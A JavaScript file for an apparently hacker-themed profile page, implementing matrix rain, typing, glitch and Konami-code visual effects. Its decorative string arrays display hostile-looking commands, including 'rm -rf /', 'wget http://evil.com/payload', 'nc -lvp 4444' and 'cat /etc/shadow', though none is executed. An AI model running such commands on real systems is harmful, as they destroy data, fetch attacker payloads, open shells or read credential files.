// Matrix Rain Effect
function initMatrix() {
    const canvas = document.getElementById('matrix-canvas');
    if (!canvas) return;
    
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()_+-=[]{}|;:,.<>?~`';
    const charArray = chars.split('');
    const fontSize = 14;
    const columns = canvas.width / fontSize;
    const drops = [];
    
    for (let x = 0; x < columns; x++) {
        drops[x] = 1;
    }
    
    function draw() {
        ctx.fillStyle = 'rgba(10, 10, 15, 0.05)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        ctx.fillStyle = '#ec4899';
        ctx.font = fontSize + 'px JetBrains Mono, monospace';
        
        for (let i = 0; i < drops.length; i++) {
            const text = charArray[Math.floor(Math.random() * charArray.length)];
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                drops[i] = 0;
            }
            drops[i]++;
        }
    }
    
    setInterval(draw, 50);
    
    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    });
}

// Typing Effect
function initTyping() {
    const typingElement = document.getElementById('typing-text');
    if (!typingElement) return;
    
    const texts = [
        'echo "Security Researcher | Bug Hunter | Code Breaker"',
        'cat /etc/motd',
        'whoami && id',
        'nmap -sV target.local',
        'python3 exploit.py --target=weak',
        'go build -o tool && ./tool',
        'ssh root@localhost',
        'git push origin main --force',
        'echo "Hack the planet!"',
        'find / -perm -4000 2>/dev/null',
        'strings /bin/bash | grep password',
        'curl -X POST https://api.target.com/flag'
    ];
    
    let textIndex = 0;
    let charIndex = 0;
    let isDeleting = false;
    let isPaused = false;
    
    function type() {
        const currentText = texts[textIndex];
        
        if (isPaused) {
            setTimeout(type, 2000);
            isPaused = false;
            isDeleting = true;
            return;
        }
        
        if (!isDeleting) {
            typingElement.textContent = currentText.substring(0, charIndex + 1);
            charIndex++;
            
            if (charIndex === currentText.length) {
                isPaused = true;
                setTimeout(type, 100);
                return;
            }
            
            setTimeout(type, 50 + Math.random() * 50);
        } else {
            typingElement.textContent = currentText.substring(0, charIndex - 1);
            charIndex--;
            
            if (charIndex === 0) {
                isDeleting = false;
                textIndex = (textIndex + 1) % texts.length;
                setTimeout(type, 500);
                return;
            }
            
            setTimeout(type, 25);
        }
    }
    
    setTimeout(type, 1000);
}

// Counter Animation
function initCounters() {
    const counters = document.querySelectorAll('[data-count]');
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const target = parseInt(entry.target.getAttribute('data-count'));
                animateCounter(entry.target, target);
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.5 });
    
    counters.forEach(counter => observer.observe(counter));
}

function animateCounter(element, target) {
    let current = 0;
    const increment = target / 50;
    const duration = 1500;
    const stepTime = duration / 50;
    
    const timer = setInterval(() => {
        current += increment;
        if (current >= target) {
            element.textContent = target + '+';
            clearInterval(timer);
        } else {
            element.textContent = Math.floor(current);
        }
    }, stepTime);
}

// Uptime Timer
function initUptime() {
    const uptimeElement = document.getElementById('uptime');
    if (!uptimeElement) return;
    
    let seconds = 0;
    
    setInterval(() => {
        seconds++;
        const hrs = Math.floor(seconds / 3600).toString().padStart(2, '0');
        const mins = Math.floor((seconds % 3600) / 60).toString().padStart(2, '0');
        const secs = (seconds % 60).toString().padStart(2, '0');
        uptimeElement.textContent = `${hrs}:${mins}:${secs}`;
    }, 1000);
}

// Fade In Animation
function initFadeIn() {
    const elements = document.querySelectorAll('.animate-fade-up');
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, { threshold: 0.1 });
    
    elements.forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(30px)';
        el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(el);
    });
}

// Card Hover Effect
function initCardHover() {
    const cards = document.querySelectorAll('.group');
    
    cards.forEach(card => {
        card.addEventListener('mouseenter', (e) => {
            const rect = card.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            
            card.style.setProperty('--mouse-x', `${x}px`);
            card.style.setProperty('--mouse-y', `${y}px`);
        });
    });
}

// Random Glitch Effect
function initRandomGlitch() {
    const glitchElement = document.querySelector('.glitch-text');
    if (!glitchElement) return;
    
    setInterval(() => {
        if (Math.random() > 0.95) {
            glitchElement.style.animation = 'none';
            glitchElement.offsetHeight;
            glitchElement.style.animation = 'glitch-1 0.2s ease-in-out';
            
            setTimeout(() => {
                glitchElement.style.animation = 'none';
            }, 200);
        }
    }, 100);
}

// Code Rain Effect
function createCodeRain() {
    const container = document.createElement('div');
    container.className = 'code-rain active';
    document.body.appendChild(container);
    
    const codeSnippets = [
        'SELECT * FROM users;',
        'rm -rf /',
        'sudo su',
        'chmod 777',
        'wget http://evil.com/payload',
        'nc -lvp 4444',
        'cat /etc/shadow',
        'echo "pwned"',
        'sqlmap --dump-all',
        'metasploit -x',
        'hydra -l admin',
        'john --wordlist=rockyou.txt',
        'hashcat -m 0',
        'aircrack-ng',
        'burpsuite',
        'nmap -sV -sC',
        'nikto -h',
        'dirb http://',
        'gobuster dir',
        'wfuzz -c',
    ];
    
    for (let i = 0; i < 50; i++) {
        const span = document.createElement('span');
        span.textContent = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
        span.style.left = Math.random() * 100 + '%';
        span.style.animationDuration = (Math.random() * 2 + 1) + 's';
        span.style.animationDelay = Math.random() * 2 + 's';
        span.style.fontSize = (Math.random() * 10 + 10) + 'px';
        container.appendChild(span);
    }
    
    setTimeout(() => {
        container.remove();
    }, 4000);
}

// Binary Flash Effect
function createBinaryFlash() {
    const flash = document.createElement('div');
    flash.className = 'binary-flash active';
    document.body.appendChild(flash);
    
    setTimeout(() => {
        flash.remove();
    }, 200);
}

// Screen Shake Effect
function createScreenShake() {
    document.body.classList.add('screen-shake');
    setTimeout(() => {
        document.body.classList.remove('screen-shake');
    }, 500);
}

// Glitch Layer Effect
function createGlitchLayer() {
    const layer = document.createElement('div');
    layer.className = 'glitch-layer active';
    document.body.appendChild(layer);
    
    setTimeout(() => {
        layer.remove();
    }, 200);
}

// Konami Code Effect - Simplified
function initKonamiCode() {
    let konamiCode = [];
    // Simplified: ↑↑↓↓←→←→ (removed BA)
    const konamiSequence = [38, 38, 40, 40, 37, 39, 37, 39];
    
    document.addEventListener('keydown', (e) => {
        konamiCode.push(e.keyCode);
        konamiCode = konamiCode.slice(-8);
        
        if (konamiCode.join(',') === konamiSequence.join(',')) {
            triggerKonamiEffect();
        }
    });
}

function triggerKonamiEffect() {
    console.log('%c[KONAMI] ACCESS GRANTED', 'color: #ec4899; font-size: 24px; font-weight: bold;');
    console.log('%c[SYSTEM] Bypassing security protocols...', 'color: #a855f7;');
    console.log('%c[HACK] Injecting payload...', 'color: #ec4899;');
    
    // Create overlay
    const overlay = document.createElement('div');
    overlay.className = 'konami-overlay active';
    overlay.innerHTML = `
        <div class="konami-text text-glow-pink">ACCESS GRANTED</div>
        <div class="konami-subtext">[ SYSTEM COMPROMISED ]</div>
        <div style="margin-top: 2rem; font-family: 'JetBrains Mono', monospace; color: #ec4899; font-size: 0.875rem; text-align: center;">
            <p>> Bypassing firewall... <span style="color: #22c55e;">OK</span></p>
            <p>> Injecting payload... <span style="color: #22c55e;">OK</span></p>
            <p> > Extracting data... <span style="color: #22c55e;">OK</span></p>
            <p>> Root access achieved <span style="color: #ec4899;">■</span></p>
        </div>
    `;
    document.body.appendChild(overlay);
    
    // Trigger effects
    createScreenShake();
    createGlitchLayer();
    createCodeRain();
    
    setTimeout(() => {
        createBinaryFlash();
    }, 500);
    
    setTimeout(() => {
        createCodeRain();
    }, 1000);
    
    setTimeout(() => {
        createBinaryFlash();
    }, 1500);
    
    // Remove overlay after animation
    setTimeout(() => {
        overlay.style.animation = 'konamiFadeIn 0.3s ease-out reverse';
        setTimeout(() => {
            overlay.remove();
        }, 300);
    }, 4000);
}

// Initialize All
document.addEventListener('DOMContentLoaded', function() {
    console.log('%c[SYSTEM] MrTermux Profile Loaded', 'color: #ec4899; font-weight: bold;');
    console.log('%c[INFO] All systems operational', 'color: #a855f7;');
    console.log('%c[HINT] Try the Konami Code: ↑↑↓↓←→←→', 'color: #666;');
    
    initMatrix();
    initTyping();
    initCounters();
    initUptime();
    initFadeIn();
    initCardHover();
    initRandomGlitch();
    initKonamiCode();
    
    // Add loading animation
    document.body.classList.add('loaded');
});